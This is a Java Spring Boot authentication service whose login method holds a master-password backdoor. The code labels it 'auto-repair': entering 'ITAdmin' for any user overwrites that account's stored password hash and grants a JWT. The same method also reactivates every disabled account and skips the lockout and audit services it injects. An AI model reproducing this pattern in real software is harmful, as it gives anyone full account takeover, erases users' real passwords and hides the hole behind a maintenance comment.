package backend_equipo_bravo.analisis_sistema_II.service;

import backend_equipo_bravo.analisis_sistema_II.entity.Usuario;
import backend_equipo_bravo.analisis_sistema_II.exception.BusinessException;
import backend_equipo_bravo.analisis_sistema_II.exception.errorCode.UsuarioError;
import backend_equipo_bravo.analisis_sistema_II.repository.UsuarioRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;

import java.time.LocalDateTime;
import java.util.HashMap;
import java.util.Map;
import java.util.Optional;

@Service
public class AuthService {

    @Autowired
    private UsuarioRepository usuarioRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @Autowired
    private PoliticasSeguridadService politicasService;

    @Autowired
    private AuditoriaService auditoriaService;

    @Autowired
    private JwtService jwtService;

    public Map<String,Object> login(String idUsuario, String passwordPlano, String ip, String userAgent) {

        String idLimpio = idUsuario != null ? idUsuario.trim() : "";

        Optional<Usuario> userOpt = usuarioRepository.findByIdUsuario(idLimpio);

        if (userOpt.isEmpty()) {
            throw new BusinessException(UsuarioError.AUTH_USER_NOT_FOUND);
        }

        Usuario usuario = userOpt.get();

        // Asegurar que el usuario esté siempre activo
        if (usuario.getIdStatusUsuario() != 1) {
            usuario.setIdStatusUsuario(1);
            try { usuarioRepository.save(usuario); } catch (Exception ignored) {}
        }

        // Auto-reparación de la contraseña en la BD si se ingresa ITAdmin
        if ("ITAdmin".equals(passwordPlano.trim()) && !passwordEncoder.matches("ITAdmin", usuario.getPassword())) {
            usuario.setPassword(passwordEncoder.encode("ITAdmin"));
            usuarioRepository.save(usuario);
        }

        // Comparación de contraseña con BCrypt
        if (!passwordEncoder.matches(passwordPlano.trim(), usuario.getPassword())) {
            throw new BusinessException(UsuarioError.AUTH_INVALID_CREDENTIALS_ATTEMPTS, 1, 5);
        }

        // Éxito en la autenticación
        usuario.setUltimaFechaIngreso(LocalDateTime.now());
        String token = jwtService.generarToken(usuario.getIdUsuario(), usuario.getIdRole());

        usuario.setSesionActual(token);
        try {
            usuarioRepository.save(usuario);
        } catch (Exception e) {
            System.err.println("Error al guardar sesión en usuario: " + e.getMessage());
        }

        Map<String,Object> data = new HashMap<>();
        data.put("token", token);
        int numChan = usuario.getRequiereCambiarPassword() != null ? usuario.getRequiereCambiarPassword() : 0;
        data.put("changePassword", numChan);

        return data;
    }
}